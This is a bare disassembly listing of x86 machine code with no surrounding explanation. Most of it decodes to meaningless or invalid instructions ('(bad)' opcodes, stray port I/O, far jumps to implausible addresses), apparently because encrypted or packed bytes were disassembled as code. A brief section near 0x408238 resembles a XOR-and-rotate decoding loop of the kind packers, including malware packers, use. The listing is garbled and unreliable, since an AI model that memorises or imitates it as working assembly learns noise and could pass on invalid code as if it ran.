  407ec4:	adc    dl,cl
  407ec6:	add    BYTE PTR [eax+0x60],ch
  407ec9:	(bad)  
  407eca:	cmp    al,0x2
  407ecc:	or     eax,0xd821aaf3
  407ed1:	arpl   WORD PTR ds:0x1e9ab98d,bx
  407ed7:	xchg   esi,eax
  407ed8:	inc    eax
  407ed9:	dec    esp
  407eda:	mov    bh,0x17
  407edc:	imul   esp,DWORD PTR [ebx-0x2c],0x203ebc68
  407ee3:	cmp    al,0x24
  407ee5:	out    dx,al
  407ee6:	push   ds
  407ee7:	xor    ch,bl
  407ee9:	dec    ebx
  407eea:	std    
  407eeb:	jle    0x407f49
  407eed:	(bad)  
  407eee:	cmp    al,0x65
  407ef0:	enter  0xd1b,0x60
  407ef4:	dec    eax
  407ef5:	(bad)  
  407ef6:	ds or  eax,0x8f96781a
  407efc:	in     al,dx
  407efd:	inc    ecx
  407efe:	adc    al,0x41
  407f00:	xchg   ebx,eax
  407f01:	aaa    
  407f02:	imul   ebp,DWORD PTR [edi+0x5a],0xba590993
  407f09:	add    bl,BYTE PTR [edx+0x259f5b47]
  407f0f:	add    al,0xcb
  407f11:	sar    BYTE PTR [ecx+0x5cd5cfe5],cl
  407f17:	sub    al,0x21
  407f19:	imul   esp,ebx,0xf21867b7
  407f1f:	jl     0x407ee0
  407f21:	sbb    esp,ecx
  407f23:	pop    ebx
  407f24:	cmp    al,0x75
  407f26:	xchg   ebp,eax
  407f27:	jge    0x407eac
  407f29:	sbb    al,0xd2
  407f2b:	add    al,0xe2
  407f2d:	jmp    0x4ee4fe6d
  407f32:	imul   eax,DWORD PTR [edi-0x6b],0xa0cfac0e
  407f39:	cli    
  407f3a:	aad    0xd2
  407f3c:	jl     0x49c415f3
  407f42:	dec    ebx
  407f43:	(bad)  
  407f44:	scas   eax,DWORD PTR es:[edi]
  407f45:	leave  
  407f46:	cmc    
  407f47:	fnstenv [ebx+0x1ae5d9c7]
  407f4d:	call   0x4ba27195
  407f52:	cld    
  407f53:	jmp    0x3411ecee
  407f58:	pusha  
  407f59:	test   BYTE PTR [edx],bh
  407f5b:	jnp    0x407f96
  407f5d:	fisttp QWORD PTR [esi+edx*4-0x5e]
  407f61:	push   es
  407f62:	pop    es
  407f63:	dec    esi
  407f64:	mov    ds:0x772151cd,eax
  407f69:	inc    eax
  407f6a:	div    BYTE PTR [ecx+0xc65a626]
  407f70:	jmp    DWORD PTR ds:0x2a3a5b89
  407f76:	sub    al,0x38
  407f78:	clc    
  407f79:	cmp    eax,0x704c946c
  407f7e:	(bad)  
  407f80:	xchg   esp,eax
  407f81:	push   esp
  407f82:	addr16 nop
  407f84:	icebp  
  407f85:	pop    esi
  407f86:	aas    
  407f87:	(bad)  
  407f88:	xchg   BYTE PTR ds:[ebx-0x11ed811c],bh
  407f8f:	fimul  DWORD PTR [esi+0x469f01e4]
  407f95:	pop    ebx
  407f96:	mov    BYTE PTR [edx-0xcfed56d],dh
  407f9c:	retf   
  407f9d:	int3   
  407f9e:	or     BYTE PTR ds:0x5a01c505,bl
  407fa4:	inc    edx
  407fa5:	aas    
  407fa6:	icebp  
  407fa7:	fiadd  WORD PTR [ebx+0x4a]
  407faa:	adc    edi,ecx
  407fac:	dec    edi
  407fad:	cwde   
  407fae:	in     eax,0x95
  407fb0:	inc    edi
  407fb1:	inc    esp
  407fb2:	fld    DWORD PTR [ebp-0x7fa7e900]
  407fb8:	js     0x407f83
  407fba:	jb     0x407f3e
  407fbc:	push   es
  407fbd:	ss jecxz 0x407f92
  407fc0:	push   ebp
  407fc1:	xchg   ebx,eax
  407fc2:	mov    ch,0xb7
  407fc4:	or     edi,DWORD PTR [eax-0xe6e9a86]
  407fca:	into   
  407fcb:	fld    st(0)
  407fcd:	xchg   ebx,eax
  407fce:	sbb    ebp,DWORD PTR [ecx]
  407fd0:	or     eax,0x1508e38b
  407fd5:	mov    cs,ebx
  407fd7:	pop    edi
  407fd8:	imul   BYTE PTR [eax-0x6fa74ac0]
  407fde:	(bad)  
  407fdf:	loopne 0x408027
  407fe1:	xor    dh,BYTE PTR [eax-0x37c27d2]
  407fe7:	call   0x51b96b5a
  407fec:	mov    edi,0x753a2d77
  407ff1:	(bad)  
  407ff2:	adc    ebx,DWORD PTR [edi+0x5d]
  407ff5:	add    BYTE PTR [ebx],ah
  407ff7:	(bad)  
  407ff8:	mov    ds:0x296e8cb9,eax
  407ffd:	cmp    ecx,eax
  407fff:	ja     0x407fa1
  408001:	dec    edi
  408002:	shr    DWORD PTR [eax-0x6],0x30
  408006:	pop    esp
  408007:	adc    BYTE PTR [ebx-0x4aad0e3b],dl
  40800d:	imul   ebx,edx,0x4f
  408010:	into   
  408011:	(bad)  
  408012:	push   ebp
  408013:	mov    edi,0xe1fde11
  408018:	hlt    
  408019:	push   edi
  40801a:	pop    esi
  40801b:	jmp    0x408071
  40801d:	loope  0x40805c
  40801f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408020:	dec    ebp
  408021:	leave  
  408022:	outs   dx,DWORD PTR ds:[esi]
  408023:	int3   
  408024:	arpl   WORD PTR [edi-0x2b],bp
  408027:	in     al,dx
  408028:	mov    BYTE PTR [edi],ch
  40802a:	add    esp,DWORD PTR [edi-0x5a]
  40802d:	ja     0x408081
  40802f:	mov    dh,0x31
  408031:	mov    ch,0x89
  408033:	mov    edi,0x923f4852
  408038:	push   ebp
  408039:	idiv   ch
  40803b:	out    0xf2,al
  40803d:	popa   
  40803e:	test   DWORD PTR [ecx-0x5c],ebp
  408041:	mov    ds:0xa665fd4d,eax
  408046:	xor    ebx,DWORD PTR [ebx+0x4e19cfb5]
  40804c:	mov    eax,0xc44494bd
  408051:	outs   dx,DWORD PTR es:[esi]
  408053:	push   ebx
  408054:	dec    ecx
  408055:	push   esp
  408056:	xor    eax,0x20362ec5
  40805b:	mov    bh,0xa2
  40805d:	dec    eax
  40805e:	pop    ebx
  40805f:	mov    eax,ds:0x2eabbf92
  408064:	push   cs
  408065:	adc    edx,DWORD PTR [esi+eiz*4]
  408068:	mov    ds:0x5762c412,al
  40806d:	ds mov ebp,0xbf84f276
  408073:	stos   DWORD PTR es:[edi],eax
  408074:	ins    BYTE PTR es:[edi],dx
  408075:	xchg   BYTE PTR [edi+0x50],al
  408078:	jnp    0x4080f4
  40807a:	lds    dx,DWORD PTR [esi]
  40807d:	fidiv  DWORD PTR [esi-0x39]
  408080:	clc    
  408081:	ds inc ecx
  408083:	and    eax,0xc8cde932
  408088:	dec    edi
  408089:	je     0x4080d2
  40808b:	mov    BYTE PTR [edx+eax*2],cl
  40808e:	out    0x78,eax
  408090:	fnstsw WORD PTR [ecx+0x22]
  408093:	mov    DWORD PTR [ebx-0x2d867d34],edi
  408099:	mov    dl,0x64
  40809b:	ja     0x4080ab
  40809d:	sbb    ah,ch
  40809f:	mov    bl,0xbd
  4080a1:	cwde   
  4080a2:	ret    0x3d14
  4080a5:	and    ax,0x45fa
  4080a9:	mov    BYTE PTR [ecx],dh
  4080ab:	aas    
  4080ac:	cmp    ebp,0xb5e76aad
  4080b2:	adc    esp,ebx
  4080b4:	int3   
  4080b5:	test   eax,0x621f031c
  4080ba:	xor    eax,0x74901ee2
  4080bf:	int3   
  4080c0:	test   BYTE PTR [edi+0x1f028f15],0xfa
  4080c7:	ror    BYTE PTR [edx],1
  4080c9:	push   edi
  4080ca:	dec    edi
  4080cb:	ror    DWORD PTR [edx],0x85
  4080ce:	inc    ebx
  4080cf:	jmp    0x408117
  4080d1:	or     ebp,edi
  4080d3:	inc    eax
  4080d4:	hlt    
  4080d5:	stos   DWORD PTR es:[edi],eax
  4080d6:	xchg   ch,ah
  4080d8:	inc    esi
  4080d9:	or     al,0x4b
  4080db:	jle    0x408064
  4080dd:	xor    dl,bh
  4080df:	test   DWORD PTR [edi+0x5b],0x66f40b49
  4080e6:	inc    edx
  4080e7:	into   
  4080e8:	sbb    BYTE PTR [ebx],dh
  4080ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080eb:	fidiv  WORD PTR [ecx+0x618868e1]
  4080f1:	cmc    
  4080f2:	stc    
  4080f3:	in     al,dx
  4080f4:	pop    es
  4080f5:	add    BYTE PTR [esi+0x6d],0x8c
  4080f9:	sub    DWORD PTR [edi+0x2d44d0b9],ebp
  4080ff:	bound  ebx,QWORD PTR [ebx-0x13a02309]
  408105:	sub    BYTE PTR [ebx-0xf4143a7],0xc3
  40810c:	ds ins BYTE PTR es:[edi],dx
  40810e:	sbb    ah,al
  408110:	test   DWORD PTR [eax+ebp*2-0x496663df],0x20b610db
  40811b:	xor    DWORD PTR [ebx+0x79],edx
  40811e:	cmp    ah,ah
  408120:	pop    ecx
  408121:	xor    eax,ebp
  408123:	(bad)  
  408124:	lahf   
  408125:	mov    ch,0xb6
  408127:	sub    BYTE PTR [ebx-0x2c],dl
  40812a:	sar    dl,0x54
  40812d:	scas   al,BYTE PTR es:[edi]
  40812e:	iret   
  40812f:	jnp    0x4081a9
  408131:	fcomi  st,st(0)
  408133:	jmp    0xb095:0x50df6ab
  40813a:	jae    0x408187
  40813c:	ja     0x4081b4
  40813e:	sbb    ch,BYTE PTR [eax+0x6d31df46]
  408144:	lock jo 0x408169
  408147:	dec    edx
  408148:	push   ebp
  408149:	clc    
  40814a:	pushf  
  40814b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40814c:	push   esp
  40814d:	inc    ebp
  40814e:	jne    0x40812a
  408150:	xor    DWORD PTR [esp+esi*1+0x44c905ad],ebx
  408157:	xor    DWORD PTR [ebx+ebp*4],0x4e3b4013
  40815e:	fidiv  WORD PTR [edx-0x4]
  408161:	inc    ecx
  408162:	add    al,0x2a
  408164:	push   esp
  408165:	dec    esi
  408166:	pop    ds
  408167:	dec    esp
  408168:	adc    BYTE PTR [ebx+0x61],0x57
  40816c:	or     eax,0xbf697602
  408171:	push   0x3a
  408173:	(bad)  
  408174:	sbb    BYTE PTR cs:[esi+0x4e],ch
  408178:	idiv   DWORD PTR [eax]
  40817a:	xchg   esi,esp
  40817c:	jecxz  0x4081eb
  40817e:	or     eax,DWORD PTR [edi+0x845bd04]
  408184:	lahf   
  408185:	cmc    
  408186:	jmp    0xd495:0x13488ebc
  40818d:	dec    esi
  40818e:	inc    esi
  40818f:	outs   dx,DWORD PTR ds:[esi]
  408190:	popf   
  408191:	mov    ds:0xedbd4592,al
  408196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408197:	mov    DWORD PTR [edi+0x1c],ebx
  40819a:	xor    BYTE PTR [ebp-0xa802223],0xea
  4081a1:	fisub  DWORD PTR [ecx+0x781dfc]
  4081a7:	mov    ds:0x5d42100c,eax
  4081ac:	add    ch,BYTE PTR [edi+0x45]
  4081af:	aas    
  4081b0:	dec    eax
  4081b1:	ret    
  4081b2:	test   DWORD PTR ds:[esi+esi*8-0x4b],0xcc682084
  4081bb:	(bad)  
  4081bc:	mov    ebx,0xb570151c
  4081c1:	mov    eax,ds:0x60c1b100
  4081c6:	jecxz  0x408231
  4081c8:	pop    esp
  4081c9:	aaa    
  4081ca:	fld    TBYTE PTR [ebp-0x376f87f7]
  4081d0:	jae    0x40822c
  4081d2:	dec    esi
  4081d3:	neg    BYTE PTR [edi+0x31ee3594]
  4081d9:	xor    eax,0x3e301ae9
  4081de:	inc    eax
  4081df:	and    eax,0x484216df
  4081e4:	adc    esi,DWORD PTR [esi-0x1aef2d52]
  4081ea:	out    dx,al
  4081eb:	pop    esi
  4081ec:	jmp    0x408203
  4081ee:	cmp    eax,0x31623aaf
  4081f3:	test   al,0x47
  4081f5:	push   esi
  4081f6:	cld    
  4081f7:	ins    BYTE PTR es:[edi],dx
  4081f8:	mov    ebx,0x5765d90a
  4081fd:	inc    edi
  4081fe:	mov    ds:0x864cedf3,eax
  408203:	stos   DWORD PTR es:[edi],eax
  408204:	xor    al,0xfb
  408206:	push   ebx
  408207:	gs repnz or al,dl
  40820b:	sub    dh,al
  40820d:	push   0xc4a5c13d
  408212:	add    DWORD PTR [ecx+edi*4-0x1f9cfea1],0x1aa491ec
  40821d:	je     0x4081aa
  40821f:	sub    bh,bl
  408221:	cmp    ecx,edx
  408223:	inc    ebx
  408224:	mov    esi,0xb0a80ab2
  408229:	sub    edx,0xde5bbce6
  40822f:	sbb    ebx,DWORD PTR [ebx+ebx*4-0x742793f6]
  408236:	inc    ebp
  408237:	int3   
  408238:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  408242:	xor    al,0xaa
  408244:	mov    cl,0xf
  408246:	sub    cl,al
  408248:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  408252:	add    dl,cl
  408254:	or     DWORD PTR ds:0x42a266,edi
  40825a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40825d:	xor    cl,0xaa
  408260:	sub    cl,0xf
  408263:	ror    dl,cl
  408265:	sub    DWORD PTR ds:0x42a27e,edi
  40826b:	xor    eax,eax
  40826d:	mov    eax,DWORD PTR [ebp-0xc]
  408270:	sub    DWORD PTR ds:0x42a2d6,0x42a2fa
  40827a:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  408281:	adc    ecx,DWORD PTR ds:0x42a292
  408287:	jmp    0x40a638
  40828c:	or     ch,BYTE PTR [ebp-0x21]
  40828f:	mov    WORD PTR [eax+0x5de90a8a],ds
  408295:	hlt    
  408296:	jne    0x408240
  408298:	fld    QWORD PTR [ecx+0x5b]
  40829b:	push   ebx
  40829c:	(bad)  
  40829d:	adc    eax,0x5eef8383
  4082a2:	add    DWORD PTR [ebx-0x1ba4f296],0xffffffe4
  4082a9:	gs (bad) 
  4082ab:	sub    ecx,DWORD PTR [esi+0x17b8efd5]
  4082b1:	cmp    eax,0x3cbc529d
  4082b6:	mov    ds:0x4919ced2,eax
  4082bb:	add    edx,esp
  4082bd:	inc    ebp
  4082be:	test   al,0xfa
  4082c0:	fmul   st,st(0)
  4082c2:	jmp    0xad13:0x9f4f78a0
  4082c9:	rcr    DWORD PTR [eax+0x15],cl
  4082cc:	xchg   ebp,eax
  4082cd:	inc    ebp
  4082ce:	(bad)  
  4082cf:	jae    0x40832e
  4082d1:	ins    DWORD PTR es:[edi],dx
  4082d2:	iret   
  4082d3:	jb     0x40833f
  4082d5:	aaa    
  4082d6:	add    eax,0x989dae12
  4082db:	xor    al,0x56
  4082dd:	pop    edx
  4082de:	or     edx,DWORD PTR [ebx+0x708599f9]
  4082e4:	xlat   BYTE PTR ds:[ebx]
  4082e5:	adc    DWORD PTR [eax-0x39],esp
  4082e8:	mov    ch,0x8e
  4082ea:	das    
  4082eb:	xlat   BYTE PTR ds:[ebx]
  4082ec:	cli    
  4082ed:	cmp    eax,0xaa06f8a6
  4082f2:	(bad)  
  4082f3:	loop   0x40831c
  4082f5:	ret    0xe689
  4082f8:	sub    DWORD PTR [ebx-0xa],edx
  4082fb:	pop    ecx
  4082fc:	xor    DWORD PTR [esi],edx
  4082fe:	jmp    0x408309
  408300:	jmp    0x3422b5ab
  408305:	jmp    0x408342
  408307:	mov    eax,0xcc8ede18
  40830c:	mov    ecx,0x3039a8aa
  408311:	ins    BYTE PTR es:[edi],dx
  408312:	aam    0x1
  408314:	test   DWORD PTR [ebp+0x72ae93e7],edi
  40831a:	sbb    bl,BYTE PTR [ecx+0x25ca737e]
  408320:	or     eax,0x3608ee5e
  408325:	sti    
  408326:	jmp    0xa31f4fdd
  40832b:	dec    esp
  40832c:	repz jmp 0x408310
  40832f:	paddb  mm2,QWORD PTR [edx+eiz*8]
  408333:	pusha  
  408334:	mov    DWORD PTR [eax+edx*4-0x1a],ebp
  408338:	stos   BYTE PTR es:[edi],al
  408339:	mov    al,ds:0xea99c414
  40833e:	and    eax,0x7b98ba39
  408343:	enter  0x24a7,0xfe
  408347:	xchg   BYTE PTR [ebp-0x6b],ch
  40834a:	cmp    eax,0x281333c0
  40834f:	jne    0x408382
  408351:	ror    BYTE PTR [ecx],1
  408353:	adc    ecx,ebx
  408355:	dec    esi
  408356:	mov    eax,ds:0x955fda48
  40835b:	nop
  40835c:	mov    dh,0xcd
  40835e:	pushw  cs
  408360:	mov    es,WORD PTR ds:[edi-0x59]
  408364:	add    BYTE PTR [edx+0x6226abce],ah
  40836a:	add    DWORD PTR [ebp+0x2c7b72be],0x933b60aa
  408374:	xor    DWORD PTR [ecx],edx
  408376:	xchg   ebx,eax
  408377:	sub    DWORD PTR [eax-0x4a],ebx
  40837a:	loope  0x408389
  40837c:	or     DWORD PTR [ebp+0x13],ecx
  40837f:	push   ebp
  408380:	ins    DWORD PTR es:[edi],dx
  408381:	repz xchg ecx,eax
  408383:	lahf   
  408384:	in     eax,0x57
  408386:	imul   eax,edx,0xffffffe5
  408389:	dec    ebp
  40838a:	nop
  40838b:	les    ebp,FWORD PTR [ebx]
  40838d:	ins    DWORD PTR es:[edi],dx
  40838e:	enter  0x7a0c,0x88
  408392:	lahf   
  408393:	cs push ss
  408395:	mov    al,ds:0x60aef944
  40839a:	imul   eax,DWORD PTR ds:0x2c3de4e9,0x632b2f5f
  4083a4:	pop    eax
  4083a5:	or     bl,BYTE PTR gs:[edi+edx*4]
  4083a9:	adc    eax,0x34dea142
  4083ae:	xchg   edx,eax
  4083af:	xchg   edx,eax
  4083b0:	iret   
  4083b1:	mov    ebp,0x1c963393
  4083b6:	xchg   edi,eax
  4083b7:	lahf   
  4083b8:	jo     0x4083f6
  4083ba:	or     cl,BYTE PTR [ebx]
  4083bc:	mov    ds:0x9aed2c98,eax
  4083c1:	nop
  4083c2:	sti    
  4083c3:	out    dx,al
  4083c4:	fst    QWORD PTR [eax+0x1fa0bd10]
  4083ca:	dec    edx
  4083cb:	push   cs
  4083cc:	pop    edx
  4083cd:	xchg   DWORD PTR [eax-0x2f],esp
  4083d0:	scas   eax,DWORD PTR es:[edi]
  4083d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083d2:	adc    eax,0xc448d862
  4083d7:	dec    edx
  4083d8:	jg     0x408430
  4083da:	xchg   ch,dh
  4083dc:	loopne 0x408397
  4083de:	dec    ecx
  4083df:	adc    eax,0xd45a1f92
  4083e4:	pop    ebx
  4083e5:	inc    ebx
  4083e6:	xor    DWORD PTR [eax+0x17dbe2bc],0x2307d180
  4083f0:	imul   DWORD PTR es:[eax-0x4f]
  4083f4:	lds    ecx,FWORD PTR [ebx]
  4083f6:	jo     0x4083e3
  4083f8:	sbb    ebx,DWORD PTR [edx-0xa3c0a56]
  4083fe:	mov    esi,?
  408400:	sub    al,BYTE PTR [eax]
  408402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408403:	push   edi
  408404:	push   edi
  408405:	mov    ch,bl
  408407:	rcl    ch,1
  408409:	and    eax,0x840e844a
  40840e:	xor    cl,BYTE PTR [ecx+0x10]
  408411:	dec    edi
  408413:	pop    es
  408414:	test   DWORD PTR [ebp-0x5e1e6dd3],eax
  40841a:	cs inc ebx
  40841c:	mov    ebp,0x7823ddaa
  408421:	mov    DWORD PTR [ebx+0x31],ebp
  408424:	add    edx,edi
  408426:	add    DWORD PTR [esi+edi*8-0x6d],0x7b7b83b7
  40842e:	jge    0x408426
  408430:	push   0x28
  408432:	outs   dx,DWORD PTR ds:[esi]
  408433:	and    eax,0x21b80fab
  408438:	add    eax,0xb2521ea3
  40843d:	pop    ds
  40843e:	xor    al,0xa8
  408440:	mov    eax,ds:0x543835aa
  408445:	aas    
  408446:	jbe    0x408468
  408448:	call   0xbd506d16
  40844d:	mov    esi,0x2ee5fc83
  408452:	inc    esi
  408453:	or     BYTE PTR ds:0x34fc26be,0x65
  40845a:	test   DWORD PTR [ebp-0x53],ebp
  40845d:	push   cs
  40845e:	mov    fs,WORD PTR ds:0x9e8164c2
  408464:	test   dl,0x96
  408467:	sahf   
  408468:	adc    esi,DWORD PTR [edi-0x5f]
  40846b:	pusha  
  40846c:	push   ecx
  40846d:	mov    ds:0x4e6a15c9,eax
  408472:	jb     0x40841f
  408474:	push   edi
  408475:	pop    edx
  408476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408477:	push   ebp
  408478:	and    ebx,edx
  40847a:	pop    es
  40847b:	cs (bad) 
  40847d:	out    0x28,eax
  40847f:	ds cld 
  408481:	sbb    BYTE PTR [ebp-0x29],cl
  408484:	out    0xff,al
  408486:	(bad)  
  408487:	scas   al,BYTE PTR es:[edi]
  408488:	dec    esp
  408489:	clc    
  40848a:	pop    ebx
  40848b:	into   
  40848c:	sbb    BYTE PTR [esi+0x6d],bh
  40848f:	mov    ds:0xc1ac8b9b,al
  408494:	and    BYTE PTR [esp+edi*8+0x5a],bh
  408498:	repnz mov ebx,0x97903af0
  40849e:	ret    0x46b3
  4084a1:	ret    
  4084a2:	push   ss
  4084a3:	cld    
  4084a4:	sbb    al,0x74
  4084a6:	mov    esi,0x98aa4cfa
  4084ab:	mov    bl,0x43
  4084ad:	imul   esi,DWORD PTR [eax-0x12537508],0x19
  4084b4:	mov    bl,0x53
  4084b6:	lea    edi,gs:[ebp+0x1fb4336f]
  4084bd:	inc    esi
  4084be:	je     0x4084b4
  4084c0:	aas    
  4084c1:	stos   BYTE PTR es:[edi],al
  4084c2:	in     eax,0xed
  4084c4:	xlat   BYTE PTR ds:[ebx]
  4084c5:	or     DWORD PTR [ebp-0x714f5cc3],esi
  4084cb:	add    al,0x78
  4084cd:	xchg   esi,eax
  4084ce:	mov    eax,ds:0x73697b06
  4084d3:	sub    al,0x5a
  4084d5:	mov    ebp,0x61d51ee3
  4084da:	and    al,0x8d
  4084dc:	shl    BYTE PTR [edi-0x453744fb],cl
  4084e2:	rcl    BYTE PTR cs:[ecx-0x8],1
  4084e6:	jo     0x408489
  4084e8:	add    al,0xb
  4084ea:	push   esi
  4084eb:	cmp    al,0xe8
  4084ed:	sti    
  4084ee:	push   ss
  4084ef:	(bad)  
  4084f0:	(bad)  
  4084f1:	cli    
  4084f2:	cmp    bl,BYTE PTR [ebp+0x5677948b]
  4084f8:	pusha  
  4084f9:	cli    
  4084fa:	push   edi
  4084fb:	stos   BYTE PTR es:[edi],al
  4084fc:	in     al,0xa3
  4084fe:	push   ecx
  4084ff:	(bad)  
  408500:	fcmovnb st,st(6)
  408502:	push   esp
  408503:	dec    si
  408505:	xchg   esi,eax
  408506:	push   0x28
  408508:	jnp    0x4084b0
  40850a:	cmc    
  40850b:	retf   0xeb1a
  40850e:	je     0x40853d
  408510:	mov    ebx,0xad996a9e
  408515:	jae    0x408580
  408517:	or     eax,0x26dc6273
  40851c:	lea    edi,[edi-0x46b4760c]
  408522:	hlt    
  408523:	mov    DWORD PTR [ecx],edi
  408525:	sbb    DWORD PTR [ecx+ebx*4],esi
  408528:	sub    cl,0x4e
  40852b:	mov    ecx,0x486069e5
  408530:	push   ss
  408531:	pop    DWORD PTR [edx-0x67c59ff5]
  408537:	or     al,BYTE PTR [ecx]
  408539:	stc    
  40853a:	ret    0x6382
  40853d:	test   eax,0x82789c51
  408542:	cmp    bh,BYTE PTR [ecx-0x3e5fb5aa]
  408548:	fsub   QWORD PTR [edx+eax*1+0x73]
  40854c:	pop    edx
  40854d:	shl    BYTE PTR [eax+0x71],0x3d
  408551:	(bad)  
  408553:	sar    bl,0x3
  408556:	inc    ebx
  408557:	adc    DWORD PTR [eax-0x5e2212c6],ebx
  40855d:	mov    dh,0x32
  40855f:	mov    cl,0xb
  408561:	(bad)  [esp+edi*2]
  408564:	push   cs
  408565:	(bad)  
  408566:	pusha  
  408567:	cmp    bl,ch
  408569:	daa    
  40856a:	enter  0x6610,0x5e
  40856e:	stc    
  40856f:	push   cs
  408570:	mov    eax,0x542a3bb1
  408575:	and    DWORD PTR [edi],edx
  408577:	ins    BYTE PTR es:[edi],dx
  408578:	(bad)  
  408579:	xor    BYTE PTR [ecx-0x18081732],bh
  40857f:	jae    0x4085f5
  408581:	popf   
  408582:	adc    DWORD PTR [esi],edi
  408584:	lods   eax,DWORD PTR ds:[esi]
  408585:	xor    DWORD PTR [ebx],0x3c266e5
  40858b:	(bad)  
  40858c:	push   0xa776570d
  408591:	jmp    0x9e07:0x761b594a
  408598:	xchg   ecx,eax
  408599:	adc    eax,0xb89b8dab
  40859e:	cmp    DWORD PTR [ebp+0x523d504e],ebp
  4085a4:	fisubr WORD PTR ds:[ebx]
  4085a7:	(bad)  
  4085a8:	out    0x76,al
  4085aa:	or     BYTE PTR [ebp-0x67eb7e9e],al
  4085b0:	inc    edx
  4085b1:	(bad)  
  4085b3:	stos   DWORD PTR es:[edi],eax
  4085b4:	fldenv [ebp-0x744f1130]
  4085ba:	pop    esi
  4085bb:	xor    BYTE PTR gs:[eax],bh
  4085be:	xchg   BYTE PTR [edi],bh
  4085c0:	repnz dec esp
  4085c2:	xor    bl,0xc9
  4085c5:	and    al,0x54
  4085c7:	and    BYTE PTR [edi],bl
  4085c9:	mov    BYTE PTR [eax-0x66],ch
  4085cc:	inc    DWORD PTR [ecx-0x1c]
  4085cf:	fwait
  4085d0:	sti    
  4085d1:	sub    cl,0x5b
  4085d4:	cld    
  4085d5:	shl    BYTE PTR [esi-0x1a435dea],cl
  4085db:	push   esp
  4085dc:	imul   DWORD PTR [eax+0x1dcc720d]
  4085e2:	nop
  4085e3:	call   0x1dfaa0f6
  4085e8:	mov    al,BYTE PTR [esi-0x57]
  4085eb:	hlt    
  4085ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ed:	jp     0x40856f
  4085ef:	or     eax,DWORD PTR [eax-0xf0c7c94]
  4085f5:	aas    
  4085f6:	jne    0x40858a
  4085f8:	and    dl,bh
  4085fa:	adc    al,0xf
  4085fc:	dec    DWORD PTR [eax-0x6b]
  4085ff:	and    al,0xc7
  408601:	retf   0x3135
  408604:	(bad)  
  408605:	dec    edi
  408606:	daa    
  408607:	push   cx
  408609:	dec    ecx
  40860a:	or     DWORD PTR [ebp+0x68cb8af8],ecx
  408610:	and    bh,BYTE PTR [ebp+0x46]
  408613:	xchg   edi,eax
  408614:	and    ch,BYTE PTR [ebp+0x33]
  408617:	lahf   
  408618:	xor    BYTE PTR [edi-0x4f],0x9c
  40861c:	lahf   
  40861d:	mov    edx,ebp
  40861f:	clc    
  408620:	ja     0x4085f1
  408622:	xor    BYTE PTR [ebp+0x13],bl
  408625:	xor    BYTE PTR ds:0x57ac0607,ah
  40862b:	ja     0x408650
  40862d:	adc    al,0x4e
  40862f:	sub    BYTE PTR [ebx+0x33b9ba4b],ch
  408635:	and    al,0x5
  408637:	popa   
  408638:	idiv   BYTE PTR [ebx+0x7f]
  40863b:	lahf   
  40863c:	pushf  
  40863d:	iret   
  40863e:	xchg   esi,eax
  40863f:	and    esp,DWORD PTR ds:0x1f9f49ca
  408645:	push   cs
  408646:	mov    eax,0xf10fcf6e
  40864b:	mov    cl,0xf2
  40864d:	sub    dl,BYTE PTR [eax]
  40864f:	fiadd  WORD PTR [ebp+0x6f]
  408652:	push   esi
  408653:	jge    0x408693
  408655:	inc    ecx
  408656:	jmp    0xd409:0x43d96cf3
  40865d:	inc    eax
  40865e:	fnsave [esi-0x59ac9bae]
  408664:	sbb    bh,BYTE PTR es:[ebp-0x1ea3f08f]
  40866b:	popf   
  40866c:	in     eax,0x68
  40866e:	nop
  40866f:	sub    eax,0x8b4f197a
  408674:	cdq    
  408675:	ds add ebx,esi
  408678:	in     al,0x61
  40867a:	stos   DWORD PTR es:[edi],eax
  40867b:	jl     0x408635
  40867d:	mov    ch,0x39
  40867f:	jl     0x40860e
  408681:	fwait
  408682:	jp     0x4086e3
  408684:	ja     0x4086ac
  408686:	jae    0x408648
  408688:	jnp    0x40864a
  40868a:	fsub   st(2),st
  40868c:	xor    al,0x96
  40868e:	fdiv   DWORD PTR [edi+edx*1+0x54]
  408692:	sub    eax,0x735be584
  408697:	sub    DWORD PTR [eax-0x78bf11e9],edi
  40869d:	ss pushf 
  40869f:	dec    eax
  4086a0:	out    0xe2,al
  4086a2:	outs   dx,BYTE PTR ds:[esi]
  4086a3:	jbe    0x4086a2
  4086a5:	mov    dh,0x53
  4086a7:	int    0xef
  4086a9:	dec    edi
  4086aa:	in     al,0xb0
  4086ac:	(bad)  
  4086ad:	in     eax,0x58
  4086af:	push   ss
  4086b0:	test   BYTE PTR [edi],ch
  4086b2:	jl     0x40868d
  4086b4:	mov    eax,ds:0x2ad5d1f0
  4086b9:	adc    esp,0xbd58a771
  4086bf:	outs   dx,DWORD PTR ds:[esi]
  4086c0:	mov    ecx,0x5e34b8da
  4086c5:	into   
  4086c6:	add    al,0x6
  4086c8:	and    esi,0x56
  4086cb:	adc    BYTE PTR [ebp+0x464414a3],bl
  4086d1:	std    
  4086d2:	xor    DWORD PTR [edi-0x23],esp
  4086d5:	in     al,dx
  4086d6:	(bad)  
  4086d7:	fdivp  st(4),st
  4086d9:	jmp    0xf42ef609
  4086de:	mov    ah,0x87
  4086e0:	add    dl,BYTE PTR [esi+0x6b28a7d4]
  4086e6:	mov    edx,0x7b4c5aee
  4086eb:	pop    ecx
  4086ec:	jae    0x40869c
  4086ee:	pop    ss
  4086ef:	(bad)  [eax+edx*4]
  4086f2:	gs leave 
  4086f4:	mov    edx,0x90c57271
  4086f9:	adc    dl,BYTE PTR [edi]
  4086fb:	sbb    edi,DWORD PTR [eax]
  4086fd:	stc    
  4086fe:	sbb    esp,eax
  408700:	mov    bh,0xeb
  408702:	outs   dx,DWORD PTR ds:[esi]
  408703:	(bad)  
  408704:	adc    DWORD PTR [ebx+esi*2-0x7b],ecx
  408708:	jp     0x4086a0
  40870a:	jecxz  0x4086ee
  40870c:	(bad)  
  40870d:	cmp    edx,DWORD PTR [ecx+0x3fd256c9]
  408713:	jns    0x408745
